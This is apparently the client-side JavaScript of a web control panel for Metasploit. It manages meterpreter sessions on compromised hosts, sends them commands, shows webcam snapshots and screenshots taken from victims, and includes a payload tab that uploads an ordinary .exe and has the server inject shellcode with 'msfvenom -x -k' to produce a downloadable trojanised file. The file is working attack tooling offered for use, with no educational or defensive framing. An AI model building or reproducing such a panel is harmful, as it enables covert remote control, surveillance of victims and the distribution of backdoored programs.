const socket = io({ transports: ["websocket"] });

let selectedSessionId = null;
let templatePath = null;
const cmdHistory = [];
let histIdx = -1;

// ── 연결 상태 ──────────────────────────────────────────────────────────────────

socket.on("connect", () => setStatus(true));
socket.on("disconnect", () => {
  setStatus(false);
  logEntry("warn", "서버 연결 끊김 — 재연결 시도 중...");
});

function setStatus(online) {
  const dot  = document.getElementById("status-dot");
  const text = document.getElementById("status-text");
  dot.className  = `w-2.5 h-2.5 rounded-full ${online ? "dot-on" : "dot-off"}`;
  text.textContent = online ? "Online" : "Offline";
  text.className = `text-xs ${online ? "text-cyan-400" : "text-red-400"}`;
}

// ── 서버 이벤트 ───────────────────────────────────────────────────────────────

socket.on("system_event", ({ level, message }) => {
  logEntry(level, message);
  if (message.includes("LHOST:")) {
    const m = message.match(/LHOST:\s+(\S+):(\d+)/);
    if (m) {
      document.getElementById("lhost-label").textContent = `${m[1]}:${m[2]}`;
      document.getElementById("payload-lhost").textContent = m[1];
      document.getElementById("payload-lport").textContent = m[2];
    }
  }
});

socket.on("session_update", ({ sessions }) => {
  renderSessions(sessions);
  if (selectedSessionId && !sessions.find(s => s.id === selectedSessionId)) {
    selectedSessionId = null;
    updateSelectedLabel();
    document.getElementById("btn-run").disabled = true;
  }
});

// 명령 실행 결과
socket.on("cmd_result", ({ success, command, output }) => {
  const out = document.getElementById("cmd-output");
  const prefix = success ? "" : "[ERROR] ";
  const color  = success ? "text-green-400" : "text-red-400";
  appendOutput(`meterpreter > ${command}`, "text-cyan-600");
  appendOutput(prefix + (output || "(출력 없음)"), color);
  appendOutput("", "");
  logEntry(success ? "success" : "error", `${command} → ${success ? "완료" : output}`);
});

// 이미지 (screenshot / webcam_snap)
socket.on("image_data", ({ command, data }) => {
  appendOutput(`meterpreter > ${command}`, "text-cyan-600");
  appendOutput("이미지 수신됨 ↓", "text-green-400");
  showPreview(data, command);
  logEntry("success", `✅ ${command} → 이미지 수신`);
});

function appendOutput(text, colorClass) {
  const out = document.getElementById("cmd-output");
  // 초기 안내 문구 제거
  if (out.firstChild && out.firstChild.tagName === "SPAN") out.innerHTML = "";
  const el = document.createElement("div");
  el.className = colorClass;
  el.textContent = text;
  out.appendChild(el);
  out.scrollTop = out.scrollHeight;
}

// ── 세션 ───────────────────────────────────────────────────────────────────────

function renderSessions(sessions) {
  const container = document.getElementById("session-list");
  if (!sessions || sessions.length === 0) {
    container.innerHTML = '<p class="text-gray-700 text-xs">세션 없음</p>';
    return;
  }
  container.innerHTML = sessions.map(s => `
    <div class="session-card card rounded px-4 py-2 mb-2 flex items-center justify-between ${s.id === selectedSessionId ? "active" : ""}"
         data-id="${s.id}" onclick="selectSession('${s.id}')">
      <div>
        <span class="text-cyan-300 text-sm font-bold">#${s.id}</span>
        <span class="text-gray-400 text-xs ml-3">${s.ip}</span>
        <span class="text-gray-600 text-xs ml-2">${s.platform || ""}</span>
      </div>
      <span class="text-xs px-2 py-0.5 rounded border ${
        s.type === "meterpreter"
          ? "border-cyan-800 text-cyan-400"
          : "border-gray-700 text-gray-500"
      }">${s.type}</span>
    </div>
  `).join("");
}

function selectSession(id) {
  selectedSessionId = id;
  updateSelectedLabel();
  document.getElementById("btn-run").disabled = false;
  document.querySelectorAll(".session-card").forEach(el =>
    el.classList.toggle("active", el.dataset.id === id)
  );
  logEntry("info", `세션 #${id} 선택됨`);
}

function updateSelectedLabel() {
  const el = document.getElementById("selected-label");
  el.textContent = selectedSessionId ? `선택: #${selectedSessionId}` : "세션 선택 안 됨";
  el.className = `text-xs ${selectedSessionId ? "text-cyan-400" : "text-gray-700"}`;
}

document.getElementById("btn-refresh").addEventListener("click", () =>
  socket.emit("request_sessions")
);

// ── 탭 ────────────────────────────────────────────────────────────────────────

document.querySelectorAll(".tab-btn").forEach(btn => {
  btn.addEventListener("click", () => {
    document.querySelectorAll(".tab-btn").forEach(b => b.classList.remove("active"));
    document.querySelectorAll(".tab-panel").forEach(p => p.classList.remove("active"));
    btn.classList.add("active");
    document.getElementById(`tab-${btn.dataset.tab}`).classList.add("active");
  });
});

// ── 명령 입력 ─────────────────────────────────────────────────────────────────

function runCommand() {
  const input = document.getElementById("cmd-input");
  const cmd = input.value.trim();
  if (!cmd || !selectedSessionId) return;
  cmdHistory.unshift(cmd);
  histIdx = -1;
  input.value = "";
  socket.emit("run_command", { session_id: selectedSessionId, command: cmd });
}

document.getElementById("btn-run").addEventListener("click", runCommand);

document.getElementById("cmd-input").addEventListener("keydown", e => {
  if (e.key === "Enter") {
    runCommand();
  } else if (e.key === "ArrowUp") {
    e.preventDefault();
    if (histIdx < cmdHistory.length - 1) {
      histIdx++;
      document.getElementById("cmd-input").value = cmdHistory[histIdx];
    }
  } else if (e.key === "ArrowDown") {
    e.preventDefault();
    if (histIdx > 0) {
      histIdx--;
      document.getElementById("cmd-input").value = cmdHistory[histIdx];
    } else {
      histIdx = -1;
      document.getElementById("cmd-input").value = "";
    }
  }
});

// 빠른 명령어 버튼
document.querySelectorAll(".quick-cmd").forEach(btn => {
  btn.addEventListener("click", () => {
    document.getElementById("cmd-input").value = btn.dataset.cmd;
    document.getElementById("cmd-input").focus();
  });
});

// ── 이미지 프리뷰 ─────────────────────────────────────────────────────────────

function showPreview(src, label) {
  document.getElementById("preview-area").classList.remove("hidden");
  document.getElementById("preview-label").textContent = label;
  document.getElementById("preview-img").src = src;
}

document.getElementById("btn-clear-preview").addEventListener("click", () => {
  document.getElementById("preview-area").classList.add("hidden");
  document.getElementById("preview-img").src = "";
});

// ── 페이로드 탭 ───────────────────────────────────────────────────────────────

socket.on("injection_progress", ({ message }) => {
  setInjectStatus(message, 40);
  logEntry("info", `⚡ ${message}`);
});

socket.on("injection_complete", ({ filename, download_url, lhost, lport }) => {
  setInjectStatus("✅ 주입 완료!", 100);
  document.getElementById("download-area").classList.remove("hidden");
  document.getElementById("download-info").textContent = `LHOST: ${lhost}:${lport}  |  ${filename}`;
  document.getElementById("btn-download").onclick = () => { window.location.href = download_url; };
  logEntry("success", `✅ 페이로드 주입 완료 — LHOST: ${lhost}:${lport}`);
  templatePath = null;
});

socket.on("injection_error", ({ message }) => {
  document.getElementById("inject-status-text").textContent = `❌ 실패: ${message}`;
  document.getElementById("inject-status-text").className = "text-xs text-red-400 mb-2";
  document.getElementById("btn-inject").disabled = !templatePath;
  logEntry("error", `❌ 주입 실패: ${message}`);
});

function setInjectStatus(text, progress) {
  document.getElementById("inject-status-area").classList.remove("hidden");
  document.getElementById("inject-status-text").textContent = text;
  document.getElementById("inject-status-text").className = "text-xs text-yellow-400 mb-2";
  document.getElementById("inject-progress-bar").style.width = `${progress}%`;
}

document.getElementById("btn-select-exe").addEventListener("click", () =>
  document.getElementById("exe-file-input").click()
);

document.getElementById("exe-file-input").addEventListener("change", async e => {
  const file = e.target.files[0];
  if (!file) return;
  e.target.value = "";

  const nameEl = document.getElementById("exe-filename");
  nameEl.textContent = `${file.name} (업로드 중...)`;
  nameEl.className = "text-xs text-yellow-400 font-mono";
  document.getElementById("btn-inject").disabled = true;
  document.getElementById("download-area").classList.add("hidden");
  document.getElementById("inject-status-area").classList.add("hidden");

  const form = new FormData();
  form.append("file", file);
  try {
    const res  = await fetch("/api/payload/upload", { method: "POST", body: form });
    const data = await res.json();
    if (data.error) {
      nameEl.textContent = "업로드 실패";
      nameEl.className = "text-xs text-red-400 font-mono";
      logEntry("error", `❌ 업로드 실패: ${data.error}`);
      return;
    }
    templatePath = data.template_path;
    nameEl.textContent = file.name;
    nameEl.className = "text-xs text-green-400 font-mono";
    document.getElementById("btn-inject").disabled = false;
    logEntry("info", `📁 ${file.name} 업로드 완료`);
  } catch (err) {
    nameEl.textContent = "오류";
    nameEl.className = "text-xs text-red-400 font-mono";
    logEntry("error", `❌ ${err.message}`);
  }
});

document.getElementById("btn-inject").addEventListener("click", () => {
  if (!templatePath) return;
  document.getElementById("btn-inject").disabled = true;
  document.getElementById("download-area").classList.add("hidden");
  setInjectStatus("msfvenom 실행 중... (30~60초 소요)", 10);
  socket.emit("inject_payload", { template_path: templatePath });
  logEntry("info", "⚡ 셸코드 주입 시작 (msfvenom -x -k)");
});

// ── Kill All / Port Kill ──────────────────────────────────────────────────────

document.getElementById("btn-kill-all").addEventListener("click", () =>
  document.getElementById("kill-modal").classList.remove("hidden")
);
document.getElementById("kill-cancel").addEventListener("click", () =>
  document.getElementById("kill-modal").classList.add("hidden")
);
document.getElementById("kill-confirm").addEventListener("click", () => {
  document.getElementById("kill-modal").classList.add("hidden");
  socket.emit("kill_all");
  logEntry("warn", "🛑 KILL ALL 실행됨");
  selectedSessionId = null;
  updateSelectedLabel();
  document.getElementById("btn-run").disabled = true;
});

document.getElementById("btn-kill-port").addEventListener("click", () => {
  socket.emit("kill_port");
  logEntry("warn", "🔌 PORT KILL 실행됨");
});

// ── 이벤트 로그 ───────────────────────────────────────────────────────────────

function logEntry(level, message) {
  const container = document.getElementById("log-container");
  const time = new Date().toLocaleTimeString("ko-KR", { hour12: false });
  const colors = { info: "text-gray-500", success: "text-green-400", warn: "text-yellow-400", error: "text-red-400" };
  const el = document.createElement("div");
  el.className = `py-0.5 px-1 border-b border-gray-900 ${colors[level] || "text-gray-500"}`;
  el.textContent = `[${time}] ${message}`;
  container.appendChild(el);
  while (container.children.length > 100) container.removeChild(container.firstChild);
  container.scrollTop = container.scrollHeight;
}

document.getElementById("btn-clear-log").addEventListener("click", () => {
  document.getElementById("log-container").innerHTML = "";
});
